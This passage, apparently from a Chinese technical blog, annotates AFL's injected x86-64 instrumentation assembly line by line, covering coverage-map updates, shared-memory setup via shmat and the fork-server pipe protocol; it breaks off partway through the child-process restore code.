<li>这是一个条件编译块，根据操作系统定义了 <code>__OpenBSD__</code> 或 <code>__FreeBSD__</code> 并且版本较低于 9，它会使用 <code>.byte</code> 汇编指令来加载 <code>0x9f</code> 到 <code>%al</code> 寄存器（加载寄存器 AH 中的标志位）。否则，直接使用 <code>lahf</code> 汇编指令。然后使用 <code>seto</code> 指令将 <code>%al</code> 寄存器中的溢出标志位设置为 1。</li>
<li><code>lahf</code> 将标志寄存器的低 8 位（FLAGS 寄存器的低 8 位）的内容加载到 <code>AH</code> 寄存器中</li>
<li>首先检查是否已经存在共享内存，如果已经存在则跳转到 <code>__afl_store</code> 以开始插桩。</li>
<li>否则进入 <code>__afl_setup</code></li>
</ul>
</li>
<li><code>__afl_area_ptr</code> 共享内存<ul>
<li>这段代码首先将 <code>__afl_area_ptr</code> 符号地址（偏移量）加载到 <code>%rdx</code> 寄存器中，然后使用 <code>testq</code> 指令检查 <code>%rdx</code> 的值是否为零。如果 <code>%rdx</code> 的值为零（也就是指针为空），则跳转到标签 <code>__afl_setup</code>，表示 SHM 区域尚未映射。</li>
<li>[[#__afl_setup_first]]</li>
</ul>
</li>
</ul>
<h5 id="afl-store"><a href="#afl-store" class="headerlink" title="__afl_store"></a>__afl_store</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Calculate and store hit for the code location specified in rcx. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line">  <span class="string">&quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  incb (%rdx, %rcx, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^SKIP_COUNTS */</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_store</code> 主要的插桩点</li>
<li>用于计算和存储代码位置的执行路径信息。</li>
<li>这是一个条件编译块，当未定义 <code>COVERAGE_ONLY</code> 宏时，执行其中的代码。它将 <code>%rcx</code> 寄存器的值与 <code>__afl_prev_loc</code> 符号地址指向的值进行异或运算，然后将结果再次与 <code>__afl_prev_loc</code> 指向的值进行异或运算。接着，将 <code>__afl_prev_loc</code> 指向的值右移一位。</li>
<li><code>%rcx</code> 存储为原来的 <code>__afl_prev_loc(%rip)</code></li>
<li>条件编译<ul>
<li>这是另一个条件编译块，当定义了 <code>SKIP_COUNTS</code> 宏时，执行其中的代码。<ul>
<li>它将立即数 1 与地址 <code>(%rdx, %rcx, 1)</code> 处的内存进行或运算</li>
<li>否则直接在 <code>(%rdx, %rcx, 1)</code> 处加一。<ul>
<li><code>incb (%rdx, %rcx, 1)\n</code> 将位于地址 <code>%rdx + %rcx*1</code> 处的字节内容加一。</li>
</ul>
</li>
<li>这个内存地址是 <code>__afl_area_ptr</code> 指向的 SHM 区域中的某个计数器位置，用于记录覆盖情况。</li>
<li>Added SKIP_COUNTS and changed the behavior of COVERAGE_ONLY in config.h. Useful only for internal benchmarking. 用于内部benchmarking</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="afl-return"><a href="#afl-return" class="headerlink" title="__afl_return"></a>__afl_return</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_return:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addb $127, %al\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))</span></span><br><span class="line">  <span class="string">&quot;  .byte 0x9e /* sahf */\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  sahf\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__OpenBSD__, etc */</span></span></span><br><span class="line">  <span class="string">&quot;  ret\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_return</code>  在记录完当前代码块的执行信息后，将控制权返回到调用 <code>main_payload_64</code> 函数的地方，继续执行后续的代码<ul>
<li>这段代码首先将立即数 127 加到 <code>%al</code> 寄存器中。接着，根据操作系统的不同，使用 <code>.byte</code> 汇编指令加载 <code>0x9e</code> 到 <code>sahf</code> 指令（将标志寄存器的内容从 <code>%ah</code> 寄存器中加载），或者直接使用 <code>sahf</code> 指令。最后，使用 <code>ret</code> 指令返回到调用者。</li>
</ul>
</li>
<li>这里返回到用户代码继续</li>
</ul>
<h5 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __APPLE__</span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line">      <span class="comment">// 将 `__afl_global_area_ptr` 的地址加载到 `rdx` 寄存器中。`__afl_global_area_ptr` 是一个指向全局共享内存区域的指针，它存储在数据段。</span></span><br><span class="line">  <span class="string">&quot;  movq  (%rdx), %rdx\n&quot;</span>  </span><br><span class="line">      <span class="comment">// 这条指令从 `rdx` 寄存器指向的内存地址中读取一个指针值，并将该指针值存储回 `rdx` 寄存器中。这样，`rdx` 寄存器将包含指向全局共享内存区域的指针。</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !^__APPLE__ */</span></span></span><br><span class="line">  <span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_first\n&quot;</span></span><br><span class="line">      <span class="comment">// 如果 `__afl_global_area_ptr` 为 NULL，说明还没有共享内存区域，需要执行初始化操作。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line">      <span class="comment">// 这条指令将 `rdx` 寄存器的值（即全局共享内存区域的指针）存储到 `__afl_area_ptr` 变量中。`__afl_area_ptr` 是一个全局变量，它用于存储当前函数的代码覆盖率信息。</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span> </span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_setup</code> 这是初始化共享内存（SHM）的部分，用于存储测试用例和覆盖率信息。<ul>
<li>将 <code>__afl_setup_failure</code> 标签的值（一个字节）与零进行比较。<code>__afl_setup_failure</code> 是用于记录初始化失败次数的变量，初始值为零。</li>
<li>读取数据段指针<code>__afl_global_area_ptr</code> ，取出一个指针到rdx<ul>
<li>如果rdx为空 跳转到 [[#__afl_setup_first]]  就执行一次</li>
</ul>
</li>
<li>尝试从环境变量中获取共享内存 ID，并调用 <code>shmat()</code> 将其映射到当前进程的地址空间。</li>
</ul>
</li>
</ul>
<h5 id="afl-setup-first"><a href="#afl-setup-first" class="headerlink" title="__afl_setup_first"></a>__afl_setup_first</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> CALL_L64(str)		<span class="string">&quot;call _&quot;</span> str <span class="string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> CALL_L64(str)		<span class="string">&quot;call &quot;</span> str <span class="string">&quot;@PLT\n&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;__afl_setup_first:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span></span><br><span class="line">          <span class="comment">// 该函数用于进行 AFL 环境的初始化。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">          <span class="comment">// 在这里，将栈指针向低地址偏移的目的是为了保存一些寄存器的值，以防止在后续调用 `getenv()` 和其他 libcalls 函数时被修改。</span></span><br><span class="line">  <span class="string">&quot;  movq %rax,   0(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r8,   40(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r9,   48(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r10,  56(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r11,  64(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span></span><br><span class="line">          <span class="comment">// 这些指令用于将一些通用寄存器和 xmm 寄存器的值保存到栈上。通用寄存器用于保存整数类型数据，xmm 寄存器用于保存浮点数类型数据。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %r12\n&quot;</span></span><br><span class="line">          <span class="comment">// 将 r12 寄存器的值压入栈中，以保存原始的栈指针地址。r12 是一个 callee-saved 寄存器，即在函数调用时，它的值需要被保持不变，由被调用函数负责保存和恢复。</span></span><br><span class="line">  <span class="string">&quot;  movq  %rsp, %r12\n&quot;</span></span><br><span class="line">          <span class="comment">// 将栈指针的值保存到 r12 寄存器中，这样 r12 中就保存了原始的栈指针地址。</span></span><br><span class="line">  <span class="string">&quot;  subq  $16, %rsp\n&quot;</span></span><br><span class="line">          <span class="comment">// 将栈指针向低地址偏移 16 字节，为后续调用 `getenv()` 函数时保存参数留出空间。</span></span><br><span class="line">  <span class="string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span></span><br><span class="line">          <span class="comment">// 对栈指针进行掩码操作，保证栈指针地址按照 16 字节对齐，因为 64 位 ABI 要求栈指针是 16 字节对齐的</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span></span><br><span class="line">          <span class="comment">// 将 `.AFL_SHM_ENV` 标签的地址保存到 `rdi` 寄存器中。`.AFL_SHM_ENV` 是一个存储字符串 `&quot;__AFL_SHM_ID&quot;` 的标签</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;getenv&quot;</span>)</span><br><span class="line">          <span class="comment">// 用于进行 64 位系统调用，调用 `getenv()` 函数来获取环境变量 `__AFL_SHM_ID` 的值，并将返回值保存在 `rax` 寄存器中。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testq %rax, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  %rax, %rdi\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;atoi&quot;</span>)</span><br><span class="line">          <span class="comment">// 数将 `rdi` 中的字符串表示的共享内存 ID 转换为整数，并将结果保存在 `rax` 中。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;shmat&quot;</span>)</span><br><span class="line">          <span class="comment">// 函数将共享内存 ID 所指定的共享内存区域映射到进程的地址空间中，并将返回的共享内存区域的地址保存在 `rax` 中。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpq $-1, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Store the address of the SHM region. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, (%rdx)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__afl_setup_first</code><ul>
<li>调用 <code>getenv()</code> 函数来获取环境变量 <code>__AFL_SHM_ID</code> 的值, <code>__afl_area_ptr</code> 变量所对应的内存地址中，即保存共享内存区域的地址, 将共享内存区域的地址保存在 <code>__afl_global_area_ptr</code> 变量中</li>
</ul>
</li>
</ul>
<h5 id="afl-forkserver-afl-fork-wait-loop"><a href="#afl-forkserver-afl-fork-wait-loop" class="headerlink" title="__afl_forkserver&amp;__afl_fork_wait_loop"></a>__afl_forkserver&amp;__afl_fork_wait_loop</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_forkserver:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. We\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     push rdx (area ptr) twice to keep stack alignment neat. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %rdx\n&quot;</span></span><br><span class="line">          <span class="comment">// 这里将 `%rdx` 寄存器的值压入栈两次，目的是为了保持栈对齐。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     the parent doesn&#x27;t want to use the fork server. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">          <span class="comment">// 将变量 `__afl_temp` 的内存地址（偏移相对于 `rip` 寄存器的当前值）加载到寄存器 `rsi` 中</span></span><br><span class="line">          <span class="comment">// `.lcomm` 汇编伪指令用于在目标文件中分配具有局部作用域的共享内存空间</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> <span class="built_in">STRINGIFY</span>((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi       /* file desc */\n&quot;</span></span><br><span class="line">          <span class="comment">// #define FORKSRV_FD          198</span></span><br><span class="line">          <span class="comment">// 这里生成字符串 &quot;199&quot;  文件描述符</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">          <span class="comment">// write 199   __afl_temp 所指向的缓冲区</span></span><br><span class="line">          <span class="comment">// 将数据从地址 `__afl_temp` 所指向的缓冲区写入到文件描述符 199 所代表的文件中，写入的数据长度是 4 字节。</span></span><br><span class="line">          <span class="comment">// 用于告知  afl-fuzz父进程当前进程已准备好，可以开始进行Fork Server模式的交互了</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpq $4, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_fork_resume\n&quot;</span></span><br><span class="line">          <span class="comment">// 如果失败，则表示文件描述符已关闭，可能是因为从一个带有插桩的二进制文件中执行，或者父进程不使用 fork server 模式。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_fork_wait_loop:\n&quot;</span></span><br><span class="line">          <span class="comment">// 如果写入成功，说明父进程已收到通知，并准备与当前进程进行Fork Server模式的交互</span></span><br><span class="line">          <span class="comment">// 表示 fork server 模式的等待循环，用于等待父进程的指令并执行相应操作</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> <span class="built_in">STRINGIFY</span>(FORKSRV_FD) <span class="string">&quot;, %rdi             /* file desc */\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">          <span class="comment">// read 198   从afl-fuzz 管道中读取指令</span></span><br><span class="line">  <span class="string">&quot;  cmpq $4, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;fork&quot;</span>)</span><br><span class="line">  <span class="string">&quot;  cmpq $0, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jl   __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_fork_resume\n&quot;</span> <span class="comment">// 表示在子进程中执行</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 父进程处理</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;</span> <span class="comment">// 如果大于0，则表示在父进程中执行下面的代码。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx                   /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_fork_pid(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> <span class="built_in">STRINGIFY</span>((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi             /* file desc */\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">          <span class="comment">// write 199  子进程pid  给 afl-fuzz</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $0, %rdx                   /* no flags  */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi     /* status    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq __afl_fork_pid(%rip), %rdi /* PID       */\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;waitpid&quot;</span>)</span><br><span class="line">          <span class="comment">// 父进程 等待子进程退出</span></span><br><span class="line">  <span class="string">&quot;  cmpq $0, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jle  __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> <span class="built_in">STRINGIFY</span>((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi         /* file desc */\n&quot;</span></span><br><span class="line">  <span class="built_in">CALL_L64</span>(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">          <span class="comment">// write 199  __afl_temp 所指向的缓冲区  通知 afl-fuzz 子进程的执行结果。</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_fork_wait_loop\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="comment">// 父进程处理 over</span></span><br></pre></td></tr></table></figure>

<ul>
<li>__afl_forkserver<ul>
<li>通过 write 199 去进程间通信</li>
<li>它会进入 Fork Server 模式，该模式的目的是为了避免重复执行 <code>execve()</code> 的开销，提高执行效率</li>
</ul>
</li>
<li>__afl_fork_wait_loop<ul>
<li>开始fork进程<ul>
<li>fork后 rax为0 表示子进程 跑到 [[#__afl_fork_resume子进程处理]]</li>
<li>fork后 rax&gt;0 表示父进程<ul>
<li>将子进程的 PID 存入 <code>__afl_fork_pid</code> 变量</li>
<li>将子进程的 PID 写入文件描述符 <code>(FORKSRV_FD + 1) = 199</code> 所对应的文件中</li>
<li>使用 <code>waitpid</code> 系统调用等待子进程退出，返回值在 <code>%rax</code> 中。如果返回值小于等于0，则跳转到 <code>__afl_die</code> 标签处终止进程。</li>
<li>然后继续循环执行 <code>__afl_fork_wait_loop</code>，等待父进程的指令</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="afl-fork-resume子进程处理"><a href="#afl-fork-resume子进程处理" class="headerlink" title="__afl_fork_resume子进程处理"></a>__afl_fork_resume子进程处理</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;__afl_fork_resume:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* In child process: close fds, resume execution. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> <span class="built_in">STRINGIFY</span>(FORKSRV_FD) <span class="string">&quot;, %rdi\n&quot;</span></span><br><span class="line"><span class="built_in">CALL_L64</span>(<span class="string">&quot;close&quot;</span>)</span><br><span class="line">        <span class="comment">// 关闭 198</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq $&quot;</span> <span class="built_in">STRINGIFY</span>((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi\n&quot;</span></span><br><span class="line"><span class="built_in">CALL_L64</span>(<span class="string">&quot;close&quot;</span>)</span><br><span class="line">        <span class="comment">// 关闭 199</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r12, %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %r12\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  0(%rsp), %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  8(%rsp), %rcx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 16(%rsp), %rdi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 32(%rsp), %rsi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 40(%rsp), %r8\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 48(%rsp), %r9\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 56(%rsp), %r10\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 64(%rsp), %r11\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  96(%rsp), %xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 112(%rsp), %xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 128(%rsp), %xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 144(%rsp), 